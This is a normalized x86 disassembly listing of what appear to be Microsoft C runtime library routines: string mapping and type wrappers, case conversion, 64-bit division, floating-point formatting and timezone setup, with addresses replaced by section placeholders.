je r-xdata
inc edi
inc ecx
test edx edx
je r-xdata
test edx edx
jne r-xdata
and [ edi - 0x1 ] 0x0
jmp r-xdata
mov al [ ecx ]
dec edx
mov [ edi ] al
inc edi
inc ecx
test al al
je r-xdata
mov al [ ecx ]
dec edx
movzx esi al
test [ esi + rw-data ] 0x4
mov [ edi ] al
je r-xdata
jmp r-xdata
and [ edi - 0x2 ] 0x0
jmp r-xdata
sub_412a40
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_412a7a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_412c9e
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_412c9e
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_412cd0
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
dec edi
dec edi
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
inc esi
dec edi
jmp r-xdata
cmp esi edi
jae r-xdata
sub_412d00
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jb r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_412d40
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_412d7e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_40c4f0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_40cc70
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_412ec7
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_413cc8
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_40fd2a
pop esi
retn 0x4
sub_412f2b
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_412f9a
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_40e83e
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_40e89f
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_412f9a
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_412a7a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_413070
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4130e0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_413167
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_4131a5
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_413167
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_4131ce
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_414c1b
cmp eax 0x65
pop ecx
je r-xdata
mov cl [ rw-data ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_413228
mov eax [ esp + 0x4 ]
mov dl [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
cmp cl dl
je r-xdata
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx eax
cmp cl 0x65
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl 0x45
je r-xdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne r-xdata
dec eax
inc eax
jmp r-xdata
sub_41328e
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_415114
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_4150e7
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_4132cc
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_4151b8
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp + 0xc ]
lea eax [ esi + 0x1 ]
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add edx eax
add ecx edx
push ecx
call sub_415141
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
call sub_41332d
mov eax [ ebp + 0xc ]
add esp 0x30
pop esi
leave
retn
sub_41332d
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x18 ] bl
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi ] 0x2d
mov eax edi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setg al
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax edi
push eax
call sub_4135cf
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
jle r-xdata
mov [ edi ] 0x2d
lea eax [ edi + 0x1 ]
xor ecx ecx
cmp [ ebp + 0x18 ] bl
push r--data
sete cl
add ecx eax
add ecx [ ebp + 0xc ]
push ecx
call sub_412670
cmp [ ebp + 0x10 ] ebx
pop ecx
pop ecx
mov ecx eax
je r-xdata
mov dl [ eax + 0x1 ]
lea ecx [ eax + 0x1 ]
mov [ eax ] dl
mov eax ecx
mov cl [ rw-data ]
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns r-xdata
inc ecx
cmp ebx 0x64
jl r-xdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl r-xdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_4133ef
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_4151b8
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
add eax esi
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
push eax
call sub_415141
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push esi
push [ ebp + 0xc ]
call sub_413444
mov eax [ ebp + 0xc ]
add esp 0x2c
pop esi
leave
retn
sub_413444
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
dec eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi ] 0x2d
mov edi ebx
jne r-xdata
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea edi [ ebx + 0x1 ]
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebx
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
add edi eax
push 0x1
push edi
call sub_4135cf
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
push 0x1
push edi
call sub_4135cf
mov al [ rw-data ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
neg esi
cmp [ ebp + 0xc ] esi
jl r-xdata
neg esi
jmp r-xdata
push [ ebp + 0xc ]
push edi
call sub_4135cf
push [ ebp + 0xc ]
push 0x30
push edi
call sub_40cc70
add esp 0x14
mov [ ebp + 0xc ] esi
sub_4134eb
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
lea eax [ ebp - 0x28 ]
push edi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_4151b8
mov eax [ ebp - 0xc ]
mov ebx [ ebp + 0x10 ]
lea esi [ eax - 0x1 ]
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
mov edi eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
push edi
call sub_415141
mov eax [ ebp - 0xc ]
add esp 0x1c
dec eax
cmp esi eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
call sub_41332d
add esp 0x14
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push ebx
push [ ebp + 0xc ]
call sub_413444
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ edi - 0x2 ] al
sub_41357e
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4132cc
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4134eb
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4133ef
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_4135cf
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_412760
inc eax
push eax
push esi
add esi edi
push esi
call sub_40d490
add esp 0x10
pop esi
sub_4135f4
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xb
call sub_40e83e
cmp [ rw-data ] 0x0
pop ecx
jne r-xdata
push 0xb
call sub_40e89f
pop ecx
call sub_413622
inc [ rw-data ]
sub_413622
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xc
pop edi
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
call sub_40e83e
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
mov [ rw-data ] ebx
mov [ esp ] r--data
call sub_4152d3
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call sub_40e89f
mov [ esp ] rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_40e89f
pop ecx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bx
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_40c218
push esi
call sub_412760
inc eax
push eax
call sub_40bb22
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_4125e0
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_412670
push edi
call sub_40e89f
push 0x3
push esi
push [ rw-data ]
call sub_40c260
mov eax [ rw-data ]
add esi 0x3
add esp 0x18
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_40c111
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x1
inc esi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push 0x3f
mov edi 0x220
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x3f
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc esi
push esi
call sub_40c111
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
test eax eax
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_40c260
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_40c111
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_4138ca
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_413a76
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_413a76
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_413a76
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_413a76
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_413a76
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
